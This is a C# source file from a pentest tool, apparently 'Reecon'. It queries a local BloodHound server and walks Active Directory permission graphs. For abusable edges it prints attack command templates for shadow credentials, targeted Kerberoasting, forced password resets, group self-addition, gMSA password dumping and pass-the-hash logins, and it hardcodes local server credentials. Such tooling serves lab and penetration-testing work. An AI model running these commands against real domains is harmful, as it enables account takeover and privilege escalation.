using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using Reecon.Color;

namespace Reecon
{
    public static class Bloodhound
    {
        private const string BloodhoundUsername = "admin";
        private const string BloodhoundPassword = "Password111!"; // Intentionally displayed
        private const string BloodhoundUrl = "http://localhost:8080/"; // With trailing /

        public static void Run(string[] args)
        {
            if (args.Length == 2)
            {
                if (args[1] == "-ingest" || args[1] == "--ingest")
                {
                    Ingest();
                }
                else
                {
                    string username = args[1];
                    if (username.StartsWith('-'))
                    {
                        Console.WriteLine("You probably typo'd something.");
                        Console.WriteLine($"Usage: {General.ProgramName} -bloodhound -ingest");
                        Console.WriteLine($"Usage: {General.ProgramName} -bloodhound username@domain.com");
                    }
                    else
                    {
                        GetInfo(username);
                    }
                }
            }
            else
            {
                Console.WriteLine($"Usage: {General.ProgramName} -bloodhound -ingest");
                Console.WriteLine($"Usage: {General.ProgramName} -bloodhound username@domain.com");
            }
        }

        private static void Ingest()
        {
            string? jwt = Auth();
            if (jwt == null)
            {
                Console.WriteLine("Error - Unable to auth :(");
                return;
            }

            bool uploaded = UploadData(jwt);
            if (!uploaded)
            {
                Console.WriteLine("Error - Unable to upload :(");
                return;
            }

            Console.WriteLine("Ingestion Complete!");
        }

        private record Node(int Key, string Name, string ObjectId, string Type);

        private record Relationship(string Type, int FromKey, int ToKey);

        private static void GetInfo(string userId)
        {
            string? jwt = Auth();
            if (jwt == null)
            {
                Console.WriteLine("Error - Unable to auth :(");
                return;
            }

            Console.WriteLine("Exploring data...");
            // Get Profile ObjectId
            (string Text, HttpStatusCode StatusCode) profileIdReq = Web.DownloadString($"{BloodhoundUrl}api/v2/search?q={userId}", JWT: jwt);
            if (profileIdReq.StatusCode != HttpStatusCode.OK)
            {
                Console.WriteLine("Error - Unable to get info :(");
                return;
            }

            int propCount = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data").GetArrayLength();
            if (propCount == 0)
            {
                Console.WriteLine($"No properties found for user: {userId} - Exiting...");
                return;
            }

            string profileId = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data").GetProperty("objectid").ToString();
            Console.WriteLine("PID: " + profileId);

            // Type
            string nodeType = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data").GetProperty("type").ToString();
            if (nodeType == "User")
            {
                Console.WriteLine("Type: User");
                string nodeName = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data")[0].GetProperty("name").ToString();
                string userName = nodeName.Split('@')[0];
                string userDomain = nodeName.Split('@')[1];
                // Siblings in the same OU
                string req = $"MATCH (u:User {{name: '{nodeName}'}})<-[:Contains]-(ou:OU)-[:Contains]->(sibling:User) " + // Is ObjectId faster... ? 
                             "WHERE u <> sibling " +
                             "RETURN sibling";

                Dictionary<string, string> authHeader = new() { { "Authorization", "Bearer " + jwt } };
                string postData = $$"""{"query":"{{req}}","include_properties":true}""";
                Dictionary<string, string> headers = new() { { "Content-Type", "application/json" } };
                byte[] byteData = Encoding.ASCII.GetBytes(postData);
                Web.UploadDataResult cypherReq = Web.UploadData($"{BloodhoundUrl}api/v2/graphs/cypher", RequestHeaders: authHeader, ContentHeaders: headers, PostContent: byteData);

                // (string Text, HttpStatusCode StatusCode) cypherReq = Web.DownloadString($"{BloodhoundURL}ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={base64Req}", JWT: jwt);
                if (cypherReq.StatusCode == HttpStatusCode.OK)
                {
                    JsonDocument cypherResult = JsonDocument.Parse(cypherReq.Text);
                    int nodeCount = cypherResult.RootElement.GetProperty("data").GetProperty("nodes").GetPropertyCount();
                    if (nodeCount != 0)
                    {
                        Console.WriteLine($"- Found {nodeCount} siblings in the same OU");

                        foreach (JsonProperty memberNode in cypherResult.RootElement.GetProperty("data").GetProperty("nodes").EnumerateObject())
                        {
                            JsonElement userObject = memberNode.Value;
                            string? labelName = userObject.GetProperty("label").GetString();
                            Console.WriteLine("-- " + labelName);
                            // Console.WriteLine(memberNode.GetProperty("properties").GetProperty("displayname").GetString());
                        }

                        Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Recolor.Green)} '{userDomain}/{userName}:{"PASSWORD".Recolor(Recolor.Green)}' -request -k -dc-host {"dc".Recolor(Recolor.Green)}.{userDomain}");
                    }
                }
            }

            // Memberships
            (string Text, HttpStatusCode StatusCode) membershipsReq = Web.DownloadString($"{BloodhoundUrl}api/v2/users/{profileId}/memberships", JWT: jwt);
            JsonDocument membershipsInfo = JsonDocument.Parse(membershipsReq.Text);
            JsonElement membershipsChildren = membershipsInfo.RootElement.GetProperty("data");
            foreach (JsonElement membership in membershipsChildren.EnumerateArray())
            {
                string membershipName = membership.GetProperty("name").GetString() ?? "INVALID - BUG REELIX";
                if (membershipName.StartsWith("REMOTE MANAGEMENT USERS")) // Any other super important ones?
                {
                    Console.WriteLine("Member Of: " + membershipName.Recolor(Recolor.Green) + " <---- WINRM!!!");
                }
                // https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5
                else if (membershipName.StartsWith("PRE-WINDOWS 2000 COMPATIBLE ACCESS"))
                {
                    Console.WriteLine("Member Of: " + membershipName.Recolor(Recolor.Green) + " <---- Run --pre2k in nxc");
                }
                else
                {
                    Console.WriteLine("Member Of: " + membershipName);
                }
            }

            // Ownables 
            (string Text, HttpStatusCode StatusCode) ownablesReq = Web.DownloadString($"http://localhost:8080/api/v2/users/{profileId}/controllables?type=graph", JWT: jwt);
            if (ownablesReq.StatusCode != HttpStatusCode.OK)
            {
                Console.WriteLine("Can't get graph for id :(");
                Console.ReadLine();
            }

            var parsedNodes = ParseJsonBlob(ownablesReq.Text).Nodes;
            var parsedRelationships = ParseJsonBlob(ownablesReq.Text).Relationships;

            List<Node> nodeList = new List<Node>();
            List<Relationship> relationshipList = new List<Relationship>();


            // Console.WriteLine($"\nParsed Nodes: {parsedNodes.Count}");
            foreach (var node in parsedNodes)
            {
                Node thisNode = new Node(int.Parse(node["key"] ?? "Break"),
                    node.TryGetValue("data_name", out var name) && name != null ? name : "Unknown Name - Bug Reelix",
                    node.TryGetValue("data_objectid", out var oid) && oid != null ? oid : "Unknown Id - Bug Reelix",
                    node.TryGetValue("data_nodetype", out var nt) && nt != null ? nt : "Unknown Type - Bug Reelix");
                nodeList.Add(thisNode);
            }

            // Console.WriteLine($"\nParsed Relationships: {parsedRelationships.Count}");
            foreach (var rel in parsedRelationships)
            {
                Relationship thisRelationship = new Relationship(
                    rel.TryGetValue("label_text", out var lt) && lt != null ? lt : "",
                    int.Parse(rel["id1"] ?? "Break"),
                    int.Parse(rel["id2"] ?? "Break"));
                relationshipList.Add(thisRelationship);
            }


            Console.WriteLine();

            if (parsedNodes.Count == 0)
            {
                return;
            }

            Dictionary<int, Node> nodeMap = nodeList.ToDictionary(node => node.Key);
            Node? startNode = nodeMap.Values.FirstOrDefault(node => node.ObjectId == profileId);
            if (startNode == null)
            {
                Console.WriteLine($"Error: Could not find the starting node for PID: {profileId}");
                return;
            }

            Console.WriteLine($"Displaying relationship graph starting from: {startNode.Name} ({startNode.Type})\n");

            // 1. A queue to hold the nodes whose relationships we need to process.
            var nodesToProcess = new Queue<Node>();

            // 2. A set to track visited nodes to prevent infinite loops in case of cycles.
            var processedNodeKeys = new HashSet<int>();

            // 3. Start the traversal with our initial node.
            nodesToProcess.Enqueue(startNode);
            processedNodeKeys.Add(startNode.Key);

            // 4. Loop as long as there are nodes in the queue to process.
            while (nodesToProcess.Count > 0)
            {
                var currentNode = nodesToProcess.Dequeue();

                // Find all relationships originating from the current node
                IEnumerable<Relationship> outgoingRelationships = relationshipList.Where(rel => rel.FromKey == currentNode.Key);

                foreach (Relationship rel in outgoingRelationships)
                {
                    // Find the target node of the relationship
                    if (nodeMap.TryGetValue(rel.ToKey, out Node? targetNode))
                    {
                        // Print the relationship we found
                        Console.WriteLine($"{currentNode.Name} ({currentNode.Type}) -> {rel.Type} -> {targetNode.Name} ({targetNode.Type})");
                        GetNodeInfo(currentNode.Name, currentNode.Type, rel.Type, targetNode.Name, targetNode.Type);

                        // If we haven't processed this target node before, add it to the queue
                        // to process its relationships in a future iteration.
                        if (processedNodeKeys.Add(targetNode.Key))
                        {
                            nodesToProcess.Enqueue(targetNode);
                        }
                    }
                }
            }


            Console.WriteLine();
            Console.WriteLine();
        }

        private static void GetNodeInfo(string node1Name, string node1Type, string relationshipType, string node2Name, string node2Type)
        {
            // https://bloodhound.specterops.io/resources/edges/overview

            string ip;

            string mainDomain = "";
            if (node1Type == "User")
            {
                // user@domain.com
                mainDomain = node1Name.Split('@')[1];
            }
            else if (node1Type == "Group")
            {
                // group@domain.com
                mainDomain = node1Name.Split('@')[1];
            }
            else if (node1Type == "Computer")
            {
                // DC01.domain.com
                mainDomain = node1Name.Remove(0, node1Name.IndexOf('.') + 1);
            }
            else
            {
                Console.WriteLine($"Searching not implemented for type: {node1Type} - Bug Reelix!");
                Environment.Exit(0);
            }

            try
            {
                ip = System.Net.Dns.GetHostEntry(mainDomain).AddressList.First().ToString();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"- Unable to continue - {mainDomain} is not in your hosts file");
                General.HandleUnknownException(ex);
                return;
            }
            //
            // Users
            //

            // Most of these would technically apply to GenericAll as well

            // The User has GenericWrite to another User

            if (node1Type == "User" && relationshipType == "GenericWrite" && node2Type == "User")
            {
                string ourUserName = node1Name.Split('@')[0];
                string userDomain = node1Name.Split('@')[1];
                string otherUserName = node2Name.Split('@')[0];
                // This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN
                Console.WriteLine($"-- The User {ourUserName} can perform a Shadow Credentuaks attack against {otherUserName}");
                Console.WriteLine($"--- faketime asdasdasd bloodyAD -d {userDomain} --host dc01.{userDomain} -u '{ourUserName}' -k add shadowCredentials '{otherUserName}'");
                Console.WriteLine($"---- evil-winrm -i {userDomain} -u '{otherUserName}' -H '{"NTHASH_FROM_ABOVE".Recolor(Recolor.Green)}'");
                Console.WriteLine($"-- The User {ourUserName} can perform a targeted Kerberoast attack against {otherUserName}");
                Console.WriteLine($"--- targetedKerberoast.py -d '{userDomain}' -u '{ourUserName}' -p '{"PASSWORD".Recolor(Recolor.Green)}' --request-user '{otherUserName}'");
            }

            // The User has WriteSPN to another User
            if (node1Type == "User" && relationshipType == "WriteSPN" && node2Type == "User")
            {
                string ourUserName = node1Name.Split('@')[0];
                string userDomain = node1Name.Split('@')[1];
                string otherUserName = node2Name.Split('@')[0];
                Console.WriteLine($"- The User {ourUserName} can set the SPN of {otherUserName} and grab the hash to crack");
                Console.WriteLine($"-- bloodyAD --host {"dc".Recolor(Recolor.Green)}.{userDomain} -d {userDomain} -u {ourUserName} -p '{"PASSWORD".Recolor(Recolor.Green)}' set object {otherUserName} serviceprincipalname -v 'reelix/{otherUserName}'");
                Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Recolor.Green)} '{userDomain}/{ourUserName}:{"PASSWORD".Recolor(Recolor.Green)}' -request -k -dc-host {"dc".Recolor(Recolor.Green)}.{userDomain}");
                Console.WriteLine("-- KRB_AP_ERR_SKEW(Clock skew too great) -> faketime");
            }

            // The User has AddSelf to a group
            if (node1Type == "User" && relationshipType == "AddSelf" && node2Type == "Group")
            {
                Console.WriteLine("- Interesting Thing Found!");
                string userName = node1Name.Split('@')[0];
                string userDomain = node1Name.Split('@')[1];
                string groupName = node2Name.Split('@')[0];
                Console.WriteLine($"- {userDomain} can add themself to {groupName} due to AddSelf permissions.");
                Console.WriteLine($"-- bloodyAD --host {ip} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Recolor.Green)}' add groupMember {groupName} {userName}");
            }

            // The User has WriteOwner over another User
            if (node1Type == "User" && relationshipType == "WriteOwner" && node2Type == "User")
            {
                string firstUserName = node1Name.Split('@')[0];
                string secondUserName = node2Name.Split('@')[0];
                string domain = node1Name.Split('@')[1];
                Console.WriteLine($"- {firstUserName} has write ownership over {secondUserName}");
                Console.WriteLine($"-- bloodyAD --host {ip} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Recolor.Green)}' add genericAll {secondUserName} {firstUserName}");
                Console.WriteLine($"-- bloodyAD --host {ip} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Recolor.Green)}' set password {secondUserName} 'Password123!'");
            }

            //
            // Groups
            //

            // The Group has ForceChangePassword to a User
            if (node1Type == "Group" && relationshipType == "ForceChangePassword" && node2Type == "User")
            {
                string groupName = node1Name.Split('@')[0];
                string domain = node1Name.Split('@')[1];
                string userName = node2Name.Split('@')[0];
                Console.WriteLine($"- Members of {groupName} can change the password of {userName}");
                Console.WriteLine(
                    $"-- bloodyAD -k --host {"dc".Recolor(Recolor.Green)}.{domain} -d {domain} -u '{"OWNED-USER".Recolor(Recolor.Green)}' -p '{"OWNED-USER_PASSWORD".Recolor(Recolor.Green)}' set password {userName} 'Password123!'");
            }

            // The Group can read the password of a Computer
            if (node1Type == "Group" && relationshipType == "ReadGMSAPassword" && node2Type == "Computer")
            {
                {
                    // NodeItem computerNode = sortedNodes[1];
                    string groupName = node1Name.Split('@')[0];
                    string domain = node1Name.Split('@')[1];
                    string computerName = node2Name.Split('@')[0];
                    Console.WriteLine($"- Users of Group {groupName} can read the GMSA Passsword of the Computer {computerName}");
                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Recolor.Green)}' -p '{"UserPass".Recolor(Recolor.Green)}' -d '{domain}'");
                }
            }

            if (node1Type == "Group" && relationshipType == "ReadGMSAPassword" && node2Type == "User")
            {
                {
                    // NodeItem computerNode = sortedNodes[1];
                    string groupName = node1Name.Split('@')[0];
                    string domain = node1Name.Split('@')[1];
                    string userName = node2Name.Split('@')[0];
                    Console.WriteLine($"- Users of Group {groupName} can read the GMSA Passsword of the User {userName}");
                    Console.WriteLine($"-- faketime '2026-03-02T21:55:34' nxc ldap {domain} -u '{"UserInGroup".Recolor(Recolor.Green)}' [-p '{"UserPass".Recolor(Recolor.Green)}' / --use-kcache] --gmsa");
                }
            }

            //
            // Computers
            //

            // The Computer has AddSelf to a Group
            if (node1Type == "Computer" && relationshipType == "AddSelf" && node2Type == "Group")
            {
                string domain = node2Name.Split('@')[1];
                string computerName = node1Name.Replace('.' + domain, "") + "$"; // Computer names with commands end with a $
                string groupName = node2Name.Split('@')[0];
                Console.WriteLine($"- The Computer {computerName} can add itself to the Group {groupName}");
                Console.WriteLine(
                    $"-- bloodyAD -k --host {"dc".Recolor(Recolor.Green)}.{domain} -d {domain} -u '{computerName}' -p '{"COMPUTER-PASSWORD".Recolor(Recolor.Green)}' add groupMember {groupName} '{computerName}'");
            }

            // The Computer can ForceChangePassword of a User
            if (node1Type == "Computer" && relationshipType == "ForceChangePassword" && node2Type == "User")
            {
                string computerName = node1Name.Split('@')[0];
                string userName = node2Name.Split('@')[0];
                string domain = node2Name.Split('@')[1];
                Console.WriteLine($"- {computerName} can change the password of {userName} without knowing it!");
                Console.WriteLine($"-- net rpc password '{userName}' 'Password123!' -U '{domain}'/'{computerName}'%{"PASSWORD_OR_HASH".Recolor(Recolor.Green)}' -S '{domain}' --pw-nt-hash (If applicable)");
            }

            /*
            // The Group can read the password of a Computer
            if (sortedNodes.Count == 2 && sortedRelationships.Count == 1)
            {
                if (sortedNodes[0].Data?.NodeType == "Group" &&
                    sortedNodes[1].Data?.NodeType == "Computer" &&
                    sortedRelationships[0].LabelInfo?.Text == "ReadGMSAPassword")
                {
                    NodeItem groupNodes = sortedNodes[0];
                    // NodeItem computerNode = sortedNodes[1];
                    string? domain = groupNodes.Data?.Name?.Split('@')[1];
                    Console.WriteLine("- Interesting Thing Found!");
                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Recolor.Green)}' -p '{"UserPass".Recolor(Recolor.Green)}' -d '{domain}'");
                }
            }

            // The User has the ability to write to the "serviceprincipalname" attribute of another User
            // https://bloodhound.specterops.io/resources/edges/write-spn
            if (sortedNodes.Count == 2 && sortedRelationships.Count == 1)
            {

                if (sortedNodes[0].Data?.NodeType == "User" &&
                    sortedNodes[1].Data?.NodeType == "User" &&
                    sortedRelationships[0].LabelInfo?.Text == "WriteSPN")
                {
                    string? originUser = sortedNodes[0].Data?.Name?.Split('@')[0];
                    string? kerberoastableUser = sortedNodes[1].Data?.Name?.Split('@')[0];
                    string? domain = sortedNodes[0].Data?.Name?.Split('@')[1];
                    Console.WriteLine("- Interesting Thing Found!");
                    Console.WriteLine(
                        $"- {originUser} has the ability to write to the 'serviceprincipalname' of {kerberoastableUser} so you can do a targeted kerberoast attack against them.");
                    // https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
                    // Technically this command should be "--request-user 'kerberoastableUser'", but might as well dump all that the user can
                    // Just in case there are others
                    Console.WriteLine($"-- python3 targetedKerberoast.py -v -d '{domain}' -u '{originUser}' -p '{"PASSWORD_HERE".Recolor(Recolor.Green)}'");
                    Console.WriteLine("-- KRB_AP_ERR_SKEW(Clock skew too great) -> faketime");
                }
            }

            // User is a member of a group which has AddSelf to another Group
            if (sortedNodes.Count == 2 && sortedRelationships.Count == 1)
            {
                if (sortedNodes[0].Data?.NodeType == "User" &&
                    sortedNodes[1].Data?.NodeType == "Group" &&
                    sortedRelationships[0].LabelInfo?.Text == "AddSelf")
                {
                    Console.WriteLine("- Interesting Thing Found!");
                    NodeItem userNode = sortedNodes[0];
                    NodeItem groupNode = sortedNodes[1];
                    string? userName = userNode.Data?.Name?.Split('@')[0];
                    string? userDomain = userNode.Data?.Name?.Split('@')[1];
                    string? groupName = groupNode.Data?.Name?.Split('@')[0];
                    Console.WriteLine($"- {userDomain} can add themselves to {groupName} due to AddSelf permissions.");
                    Console.WriteLine(
                        $"-- bloodyAD --host {"IP".Recolor(Recolor.Green)} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Recolor.Green)}' add groupMember {groupName} {userName}");
                }
            }

            // User is a member of a group which has GenricAll to another User
            if (sortedNodes[0].Data?.NodeType == "User" &&
                sortedNodes[1].Data?.NodeType == "Group" &&
                sortedNodes[2].Data?.NodeType == "User" &&
                sortedRelationships[0].LabelInfo?.Text == "MemberOf" &&
                sortedRelationships[1].LabelInfo?.Text == "GenericAll")
            {
                Console.WriteLine("- Interesting Thing Found!");
                NodeItem userNode = sortedNodes[0];
                NodeItem otherUserNode = sortedNodes[2];
                string? username = userNode.Data?.Name?.Split('@')[0];
                string? otherUsername = otherUserNode.Data?.Name?.Split('@')[0];
                Console.WriteLine($"-- {username} can set the password of {otherUsername} without knowing it.");
                Console.WriteLine(
                    $"-- rpcclient -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' {"IP_HERE".Recolor(Recolor.Green)} -c 'setuserinfo {otherUsername} 23 Password123!'");
            }

            // User is a member of a group which has GenericWrite to another Group
            if (sortedNodes.Count == 3 && sortedRelationships.Count == 2)
            {
                if (sortedNodes[0].Data?.NodeType == "User" &&
                    sortedNodes[1].Data?.NodeType == "Group" &&
                    sortedNodes[2].Data?.NodeType == "Group" &&
                    sortedRelationships[0].LabelInfo?.Text == "MemberOf" &&
                    sortedRelationships[1].LabelInfo?.Text == "GenericWrite")
                {
                    Console.WriteLine("- Interesting Thing Found!");
                    NodeItem userNode = sortedNodes[0];
                    NodeItem groupNode = sortedNodes[2];
                    string? username = userNode.Data?.Name?.Split('@')[0];
                    string? userDomain = userNode.Data?.Name?.Split('@')[1];
                    string? groupName = groupNode.Data?.Name?.Split('@')[0];
                    Console.WriteLine(
                        $"-- Check if user is a member of the group: net rpc group members '{groupName}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                    Console.WriteLine(
                        $"-- Add user to group: net rpc group addmem '{groupName}' '{username}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                }
            }

            // User is a member of a group which has GenericAll to another Group
            if (sortedNodes.Count == 3 && sortedRelationships.Count == 2)
            {
                if (sortedNodes[0].Data?.NodeType == "User" &&
                    sortedNodes[1].Data?.NodeType == "Group" &&
                    sortedNodes[2].Data?.NodeType == "Group" &&
                    sortedRelationships[0].LabelInfo?.Text == "MemberOf" &&
                    sortedRelationships[1].LabelInfo?.Text == "GenericAll")
                {
                    Console.WriteLine("- Interesting Thing Found!");
                    NodeItem userNode = sortedNodes[0];
                    NodeItem groupNode = sortedNodes[2];
                    string? username = userNode.Data?.Name?.Split('@')[0];
                    string? userDomain = userNode.Data?.Name?.Split('@')[1];
                    string? groupName = groupNode.Data?.Name?.Split('@')[0];
                    Console.WriteLine(
                        $"-- Check if user is a member of the group: net rpc group members '{groupName}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                    Console.WriteLine(
                        $"-- Add user to group: net rpc group addmem '{groupName}' '{username}' -U '{username}'%{'PASSWORD".Recolor(Recolor.Green)}' -S '{userDomain}'");
                }
            }

            // Group has GenericWrite over other User nodes (Yikes)
            if (sortedNodes.Count >= 2 && sortedRelationships.Count >= 1 &&
                sortedNodes[0].Data?.NodeType == "Group" && sortedNodes[1].Data?.NodeType == "User")
            {
                List<NodeItem> userNodes = sortedNodes.Where(x => x.Data?.NodeType == "User").ToList();
                if (userNodes.Count == sortedNodes.Count - 1)
                {
                    foreach (NodeItem userNode in userNodes)
                    {
                        int nodeId = int.Parse(userNode.OriginalKey ?? "-1");
                        RelationshipItem relationship =
                            sortedRelationships.First(x => int.Parse(x.Id2 ?? "-1") == nodeId);
                        if (relationship.LabelInfo?.Text == "GenericWrite")
                        {
                            string? username = userNode.Data?.Name?.Split('@')[0];
                            Console.WriteLine($"- certipy shadow auto -u '{"USERNAME".Recolor(Recolor.Green)}' -p '{"PASSWORD".Recolor(Recolor.Green)}' -dc-ip IP -account '{username}'");
                            Console.WriteLine($" -- certipy find -u '{username}' -hashes {"HASH_FROM_ABOVE".Recolor(Recolor.Green)} -dc-ip IP_HERE -text -vulnerable -stdout");
                        }
                    }
                }
            }
            */
        }

        private static string? Auth()
        {
            // Auth, and get the JWT
            Console.Write("Authing... ");
            // String interpolation in JSON POST data - Fun!
            string postData = $$"""{"login_method":"secret","username":"{{BloodhoundUsername}}","secret":"{{BloodhoundPassword}}"}""";
            Dictionary<string, string> headers = new() { { "Content-Type", "application/json" } };
            byte[] byteData = Encoding.ASCII.GetBytes(postData);
            Web.UploadDataResult authResult = Web.UploadData($"{BloodhoundUrl}api/v2/login", PostContent: byteData, ContentHeaders: headers);
            if (authResult.StatusCode == null)
            {
                Console.WriteLine($"No HTTP Status Code - Is the Bloodhound server at {BloodhoundUrl} down?");
                // It's down - Can just exit.
                // Can probably do this better by returning an enum or something.
                Environment.Exit(0);
                return null;
            }

            if (authResult.StatusCode != HttpStatusCode.OK)
            {
                Console.WriteLine("Auth Failed.");
                return null;
            }

            Console.WriteLine("Authed!");
            string jwt = JsonDocument.Parse(authResult.Text).RootElement.GetProperty("data")
                .GetProperty("session_token").ToString();
            return jwt;
        }

        private static bool UploadData(string jwt)
        {
            string uploadFilePath = "bloodhound.zip";
            if (!File.Exists(uploadFilePath))
            {
                Console.WriteLine($"Error - File not found at {uploadFilePath}");
                return false;
            }

            // Use the JWT to create a File Upload Job
            Dictionary<string, string> authHeader = new() { { "Authorization", "Bearer " + jwt } };
            byte[] emptyPost = new byte[1];
            Web.UploadDataResult fileUploadJob = Web.UploadData($"<http://localhost:8080/api/v2/file-upload/start>",
                RequestHeaders: authHeader, PostContent: emptyPost);
            if (fileUploadJob.StatusCode != HttpStatusCode.Created)
            {
                Console.WriteLine("Job Creation Failed.");
                return false;
            }

            int jobId = JsonDocument.Parse(fileUploadJob.Text).RootElement.GetProperty("data").GetProperty("id")
                .GetInt32();

            // Use the JWT and Job ID to add the Zip to the Job
            Dictionary<string, string> zipHeader = new Dictionary<string, string>
                { { "Content-Type", "application/zip" } };

            byte[] fileBytes = File.ReadAllBytes(uploadFilePath);
            Web.UploadDataResult zipUpload = Web.UploadData($"<http://localhost:8080/api/v2/file-upload/{jobId}>",
                RequestHeaders: authHeader, ContentHeaders: zipHeader, PostContent: fileBytes);

            if (zipUpload.StatusCode != HttpStatusCode.Accepted)
            {
                Console.WriteLine("File Upload Failed.");
                return false;
            }

            // Start the Job processing
            Web.UploadDataResult fileUploadComplete = Web.UploadData(
                $"<http://localhost:8080/api/v2/file-upload/{jobId}/end>",
                RequestHeaders: authHeader, PostContent: emptyPost);

            if (fileUploadComplete.StatusCode != HttpStatusCode.OK)
            {
                // Pushed
                Console.WriteLine("File Upload Finalize Failed :(");
                return false;
            }

            // Watch the ingesting process until it's completed

            // Due to a bug with the API
            // <https://github.com/SpecterOps/BloodHound/issues/1505>
            // This is far more complicated than it should be.
            Console.WriteLine($"File Upload finalized with Job ID: {jobId}");
            Console.WriteLine("Data needs to be ingested - This may take awhile.");
            DateTime beforeData = DateTime.Now;
            Console.Write("Ingesting...");

            string statusMessage = "";
            while (statusMessage != "Complete") // If it fails. then this loops forever - Never had that yet, so :p
            {
                string jobData = Web.DownloadString("<http://localhost:8080/api/v2/file-upload?id=>" + jobId, JWT: jwt).Text;
                JsonElement.ArrayEnumerator dataArray = JsonDocument.Parse(jobData).RootElement.GetProperty("data").EnumerateArray();

                // Could probably refactor this entire thing to a single LINQ query since all we need is the value that matches the id...
                foreach (JsonElement dataItem in dataArray)
                {
                    if (dataItem.GetProperty("id").GetInt32() == jobId)
                    {
                        statusMessage = dataItem.GetProperty("status_message").GetString() ?? string.Empty;
                        // A progress dot per loop whilst waiting
                        Console.Write(".");
                        break;
                    }
                }

                // Wait for it to complete 
                Thread.Sleep(2500);
            }

            DateTime afterData = DateTime.Now;
            TimeSpan ingestTime = afterData - beforeData;
            Console.WriteLine();
            Console.WriteLine($"Upload ingested in {(int)ingestTime.TotalSeconds} seconds.");
            return true;
        }

        // Here be dragons
        private static (List<Dictionary<string, string>> Nodes, List<Dictionary<string, string>> Relationships) ParseJsonBlob(string jsonBlob)
        {
            var nodes = new List<Dictionary<string, string>>();
            var relationships = new List<Dictionary<string, string>>();
            using JsonDocument document = JsonDocument.Parse(jsonBlob);
            JsonElement root = document.RootElement;
            foreach (JsonProperty property in root.EnumerateObject())
            {
                string key = property.Name;
                JsonElement value = property.Value;
                if (int.TryParse(key, out _)) // Node
                {
                    try
                    {
                        nodes.Add(ParseNode(value, key));
                    }
                    catch (JsonException ex)
                    {
                        Console.WriteLine($"Error deserializing node with key '{key}': {ex.Message}");
                    }
                }
                else if (key.StartsWith("rel_", StringComparison.OrdinalIgnoreCase)) // Relationship
                {
                    try
                    {
                        relationships.Add(ParseRelationship(value, key));
                    }
                    catch (JsonException ex)
                    {
                        Console.WriteLine($"Error deserializing relationship with key '{key}': {ex.Message}");
                    }
                }
            }

            return (nodes, relationships);
        }

        private static Dictionary<string, string> ParseNode(JsonElement element, string originalKey)
        {
            var dict = new Dictionary<string, string>();
            dict["key"] = originalKey;
            if (element.TryGetProperty("color", out JsonElement p)) dict["color"] = p.GetString() ?? "";
            if (element.TryGetProperty("size", out p)) dict["size"] = p.GetInt32().ToString();
            if (element.TryGetProperty("data", out JsonElement dataProp) && dataProp.ValueKind == JsonValueKind.Object)
            {
                if (dataProp.TryGetProperty("name", out JsonElement n)) dict["data_name"] = n.GetString() ?? "";
                if (dataProp.TryGetProperty("nodetype", out n)) dict["data_nodetype"] = n.GetString() ?? "";
                if (dataProp.TryGetProperty("objectid", out n)) dict["data_objectid"] = n.GetString() ?? "";
                if (dataProp.TryGetProperty("system_tags", out n)) dict["data_system_tags"] = n.GetString() ?? "";
            }

            if (element.TryGetProperty("border", out JsonElement border) && border.ValueKind == JsonValueKind.Object)
            {
                if (border.TryGetProperty("color", out JsonElement b)) dict["border_color"] = b.GetString() ?? "";
            }

            if (element.TryGetProperty("fontIcon", out JsonElement font) && font.ValueKind == JsonValueKind.Object)
            {
                if (font.TryGetProperty("text", out JsonElement f)) dict["fonticon_text"] = f.GetString() ?? "";
            }

            if (element.TryGetProperty("label", out JsonElement label) && label.ValueKind == JsonValueKind.Object)
            {
                if (label.TryGetProperty("backgroundColor", out JsonElement l)) dict["label_backgroundcolor"] = l.GetString() ?? "";
                if (label.TryGetProperty("center", out l)) dict["label_center"] = l.GetBoolean().ToString();
                if (label.TryGetProperty("fontSize", out l)) dict["label_fontsize"] = l.GetInt32().ToString();
                if (label.TryGetProperty("text", out l)) dict["label_text"] = l.GetString() ?? "";
            }

            return dict;
        }

        private static Dictionary<string, string> ParseRelationship(JsonElement element, string originalKey)
        {
            var dict = new Dictionary<string, string>();
            dict["key"] = originalKey;
            if (element.TryGetProperty("color", out JsonElement p)) dict["color"] = p.GetString() ?? "";
            if (element.TryGetProperty("id1", out p)) dict["id1"] = p.GetString() ?? "";
            if (element.TryGetProperty("id2", out p)) dict["id2"] = p.GetString() ?? "";
            if (element.TryGetProperty("end2", out JsonElement end) && end.ValueKind == JsonValueKind.Object)
            {
                if (end.TryGetProperty("arrow", out JsonElement e)) dict["end2_arrow"] = e.GetBoolean().ToString();
            }

            if (element.TryGetProperty("label", out JsonElement label) && label.ValueKind == JsonValueKind.Object)
            {
                if (label.TryGetProperty("text", out JsonElement l)) dict["label_text"] = l.GetString() ?? "";
            }

            return dict;
        }
    }
}